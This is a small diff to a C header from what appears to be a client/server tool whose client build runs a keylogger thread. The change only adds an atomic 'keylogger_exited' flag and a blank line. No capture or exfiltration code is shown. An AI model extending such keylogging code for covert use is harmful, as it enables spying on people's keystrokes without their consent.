@@ -14,6 +14,7 @@
 #define INITIAL_IP 10
 #define MESSAGE_BUFFER_LENGTH 1024
 #define RESPONSE_BUFFER_LENGTH 4096
+
 struct server_options;
 
 enum command_codes {
@@ -43,6 +44,7 @@ struct session_info {
 #ifdef CLIENT_BUILD
     struct client_options * client_options_;
     _Atomic int run_keylogger;
+    _Atomic int keylogger_exited;
     char * device_path;
     pthread_t keylogger_thread;
 #endif
